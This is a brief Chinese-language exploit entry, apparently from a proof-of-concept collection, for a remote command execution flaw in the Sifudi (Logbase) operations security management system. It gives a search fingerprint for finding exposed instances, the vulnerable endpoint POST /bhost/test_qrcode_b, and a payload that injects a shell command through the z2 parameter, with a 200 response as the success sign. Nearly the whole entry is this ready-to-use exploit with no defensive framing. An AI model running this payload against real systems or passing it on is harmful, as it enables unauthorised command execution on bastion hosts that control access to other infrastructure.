# 思福迪运维安全管理系统test_qrcode_b存在远程命令执行漏洞

思福迪运维安全管理系统 ｜ 命令执行 ｜ —
- **指纹**：`body="Logbase运维安全管理系统"`
- **请求**：`POST /bhost/test_qrcode_b HTTP/1.1`

**Payload**
```
z1=1&z2="id;"&z3=bhost
```
- **响应特征**：200